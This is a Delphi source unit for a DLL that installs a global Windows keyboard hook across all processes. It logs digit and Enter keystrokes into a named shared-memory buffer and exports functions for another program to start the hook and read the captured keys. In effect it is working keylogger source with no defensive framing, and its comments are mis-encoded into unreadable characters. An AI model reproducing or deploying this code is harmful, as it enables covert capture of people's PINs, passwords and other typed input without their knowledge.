unit U_HookDLL;

interface

uses
  Windows, Messages, SysUtils;

const
  BUFFER_SIZE = 16 * 1024;                  //�ļ�ӳ�䵽�ڴ�Ĵ�С
  HOOK_MEM_FILENAME = 'MEM_FILE';           //ӳ���ļ�����
  HOOK_MUTEX_NAME = 'MUTEX_NAME';           //��������

type
  //�������ݽṹ
  TShared = record
    Keys: array[0..BUFFER_SIZE - 1] of ShortString;
    KeyCount: Integer;
  end;
  //�������ݽṹָ��
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;              //�ļ�����ͻ�����
  hOldKeyHook: HHook;                       //���ӱ���
  Shared: PShared;                          //�������

implementation

//���̹��ӻص�����
function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
  stdcall; export;
var
  vKey: Integer;
  TmpStr: ShortString;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if (iCode = HC_ACTION) or (iCode = HC_NOREMOVE) then
    begin
      //��ȡ������Virtual Key Code
      vKey := wParam;
      //�жϰ����Ƿ��ڰ���״̬
      if GetAsyncKeyState(vKey) = -32767 then
      begin
        TmpStr := '';

        case vKey of
          13:  TmpStr := '[Enter]';

          //Number: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9
          48:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '0';

          49:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '1';

          50:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '2';

          51:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '3';

          52:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '4';

          53:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '5';

          54:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '6';

          55:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '7';

          56:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '8';

          57:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '9';

          //NumberPad
          96..105:
               //Number: 0..9
               TmpStr := IntToStr(vKey - 96);
        end;

        if TmpStr <> '' then
        begin
          //����ȡ�İ�����Ϣд�뻺����
          Shared^.Keys[Shared^.KeyCount] := TmpStr;
          Inc(Shared^.KeyCount);

          //��������ʱ���
          if Shared^.KeyCount > BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end;
      end;
    end;

    //��������Ϣ����������ȥ
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam);
  end;
end;

//��װ���̹���
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;

  if hOldKeyHook = 0 then
  begin
    //WH_KEYBOARD:���̹���, KeyHookProc:�ص�����, HInstance:�ص�����ʵ��, �߳�ID
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;

  Result := (hOldKeyHook <> 0);
end;

//ж�ؼ��̹���
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;

  Result := (hOldKeyHook = 0);
end;

//���ز���İ�������
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

//����ָ������
function GetKey(Index: Integer): ShortString; export;
begin
  Result := '';

  if (Index > -1) and (Index < BUFFER_SIZE) then
    Result := Shared^.Keys[Index];
end;

//��մ�Ű����Ļ�����
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

//���������б�
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  //�����������, ֻ����һ������ʹ�ô�DLL
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);

  //���ļ�ӳ��
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);

  //��������ڸ��ļ�ӳ�������´���
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
      SizeOf(TShared), HOOK_MEM_FILENAME);

  //�ļ�ӳ���ڴ�
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);

  //�ͷŻ������
  ReleaseMutex(HookMutex);

  //�رջ�����
  CloseHandle(HookMutex);

finalization
  //ж�ؼ��̹���
  if hOldKeyHook <> 0 then
    DisableKeyHook;

  //�ͷ�ӳ��
  UnMapViewOfFile(Shared);

  //�ر�ӳ���ļ����
  CloseHandle(MemFile);

end.